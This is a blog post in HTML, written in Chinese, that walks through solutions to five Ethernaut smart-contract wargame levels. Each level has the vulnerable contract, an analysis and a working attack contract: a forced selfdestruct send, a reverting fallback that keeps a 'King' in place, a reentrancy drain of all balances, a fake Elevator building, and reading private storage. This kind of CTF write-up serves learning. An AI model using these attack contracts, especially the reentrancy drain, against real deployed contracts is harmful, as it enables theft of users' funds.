@@ -1,0 +1,681 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaocai">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Force123456789101112131415161718&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force &amp;#123;&#x2F;*                   MEOW ?         &#x2F;\_&#x2F;\   &#x2F;    ____&#x2F; o o \  &#x2F;~____  &#x3D;ø&#x3D; &#x2F; (______)__m_m)*&#x2F;&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut">
+<meta property="og:url" content="http://xiaoxiaoxiaoxiaocai.github.io.com/2023/11/27/Ethernaut/index.html">
+<meta property="og:site_name" content="xiaocai">
+<meta property="og:description" content="Force123456789101112131415161718&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force &amp;#123;&#x2F;*                   MEOW ?         &#x2F;\_&#x2F;\   &#x2F;    ____&#x2F; o o \  &#x2F;~____  &#x3D;ø&#x3D; &#x2F; (______)__m_m)*&#x2F;&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20175711.png">
+<meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222116.png">
+<meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222139.png">
+<meta property="article:published_time" content="2023-11-27T08:28:03.000Z">
+<meta property="article:modified_time" content="2023-11-29T14:25:03.602Z">
+<meta property="article:author" content="xiaocai">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20175711.png">
+  
+  
+  
+  <title>Ethernaut - xiaocai</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xiaoxiaoxiaoxiaocai.github.io.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xiaocai&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wallhaven-d6v3jo_1920x1080.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Ethernaut"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-27 16:28" pubdate>
+          November 27, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Ethernaut</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =ø= /<br> (______)__m_m)<br><br>*/&#125;<br><br>contract Hack&#123;<br>  constructor(address payable _owner)payable&#123;<br>    selfdestruct( _owner);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="King"><a href="#King" class="headerlink" title="King"></a>King</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract King &#123;<br><br>  address king;<br>  uint public prize;<br>  address public owner;<br><br>  constructor() payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    payable(king).transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要求我们成为国王，并且不再改变。</p>
+<h4 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h4><p>然而成为国王需要我们msg.value 超过上个国王的prize，并且msg.sender &#x3D;&#x3D; owner。显然第二个要求成立，但是当我们成为国王后，需要阻止别人超过我们。这时，我们发现receive函数是先转账，然后再修改成为国王的。因此，如果我们拒绝获得转账，那么就可以保持我们是国王了。</p>
+<h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>我们需要先得到上个国王的prize，只需运行King合约的prize。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract King &#123;<br><br>  address king;<br>  uint public prize;<br>  address public owner;<br><br>  constructor() payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    payable(king).transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address) &#123;<br>    return king;<br>  &#125;<br>&#125;<br>contract Hack&#123;<br>  constructor(address payable target) payable&#123;<br>    uint prize= King(target).prize();<br>    (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);<br>    require(ok,&#x27;call.failed&#x27;);<br>  &#125;<br>  //fallback() external payable&#123;<br>  //revert();<br>  //&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">fallback() external payable&#123;<br>revert();<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>该函数也就相当于什么的没有，即拒绝转账。</p>
+<h3 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a><strong>Re-entrancy</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.12;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable <br></code></pre></td></tr></table></figure>
+
+<p>要求盗取所有余额。</p>
+<h4 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h4><p>是重入攻击，漏洞在于withdraw函数。可以看到他是先调用了<code>msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</code>然后再在balance里面将存储的余额减去amount。这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，因为call的参数是空，所以会调用攻击合约的fallback函数，我们在fallback函数里面再次调用withdraw，这样套娃，就能将合约里面的钱都偷出来。</p>
+<h4 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface IReentrance &#123;<br>    function withdraw(uint256 _amount) external;<br>&#125;<br><br>contract Reentrance &#123;<br>    address levelInstance;<br><br>    constructor(address _levelInstance) &#123;<br>        levelInstance = _levelInstance;<br>    &#125;<br><br>    function claim(uint256 _amount) public &#123;<br>        IReentrance(levelInstance).withdraw(_amount);<br>    &#125;<br><br>    fallback() external payable &#123;<br>        IReentrance(levelInstance).withdraw(msg.value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>还有一种是循环调用withdraw函数,并加以限制。</p>
+<p>我们需要进行donate进行转账，来满足第一个条件，所以</p>
+<p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20175711.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2023-11-27 175711"></p>
+<p>然后执行attack函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface IReentrance &#123;<br>    function withdraw(uint256) external payable;<br>    function donate(address) external payable;<br>&#125;<br>contract Hack&#123;<br>  IReentrance private immutable target;<br>  constructor(address _target)&#123;<br>    target= IReentrance(_target);<br>  &#125;<br>  function attack() external payable&#123;<br>    target.donate&#123;value: 1e18&#125;(address(this));<br>    target.withdraw(1e18);<br>    require(address(target).balance ==0,&#x27;target balance&gt;0&#x27;);<br>    selfdestruct(payable(msg.sender));<br>  &#125;<br>  receive()external payable&#123;<br>    uint amount=min(1e18,address(target).balance);<br>    if(amount&gt;0)&#123;<br>      target.withdraw(amount);<br>    &#125;<br>  &#125;<br>  function min(uint x,uint y) private pure returns(uint)&#123;<br>    return x&lt;= y ? x : y;<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a><strong>Elevator</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>要求到达top floor。</p>
+<p>buliding是一个加载调用者得知的接口。而要想达到top floor。则须经过isLastFloor的检测。然而却需要两次检测，第一次是false，第二次是true。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br>contract Hack&#123;<br>  Elevator private immutable target;<br>  uint public count;<br>  constructor(address _target)&#123;<br>     target=Elevator(_target);<br>  &#125;<br>  function pwn() external&#123;<br>    target.goTo(1);<br>    require(target.top(),&#x27;not top&#x27;);<br>  &#125;<br>  function isLastFloor(uint) external returns(bool)&#123;<br>    count++;<br>    return count&gt;1;<br>  &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当我们调用goTo函数时Building building &#x3D; Building(msg.sender);，将是攻击合约的地址。我们创建isLastFloor，通过跟踪调用次数，来进行检验。</p>
+<h3 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a><strong>Privacy</strong></h3><p>要求unlock为false，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true; //1 slot0<br>  uint256 public ID = block.timestamp; // 32 slot1<br>  uint8 private flattening = 10; //2 slot2<br>  uint8 private denomination = 255; //2 slot2<br>  uint16 private awkwardness = uint16(block.timestamp); //4 slot2<br>  bytes32[3] private data; //32 slot3<br><br>  constructor(bytes32[3] memory _data) &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要想解开，需要使 _key &#x3D;&#x3D; bytes16(data[2]), 也就是说我们需要得到定长数组data的第三个数据。由于变量是私有的，没有getter函数可以直接调用获得存储的key。</p>
+<p>但是可以使用web3库来调用。根据存储的规则，data数组为定长数组，第一个数据存储再slot3，所以data[2]存储在slot5.</p>
+<p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222116.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2023-11-29 222116"></p>
+<p>然后需要前16个字节，两个字符为一个字节，2+2*16&#x3D;34</p>
+<p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222139.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2023-11-29 222139"></p>
+<p>得到密钥，然后将其合约填入并调用unlock函数即可通关。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Blockchain/" class="category-chain-item">Blockchain</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Ethernaut</div>
+      <div>http://xiaoxiaoxiaoxiaocai.github.io.com/2023/11/27/Ethernaut/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>xiaocai</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 27, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/21/CREATE2/" title="CREATE2">
+                        <span class="hidden-mobile">CREATE2</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
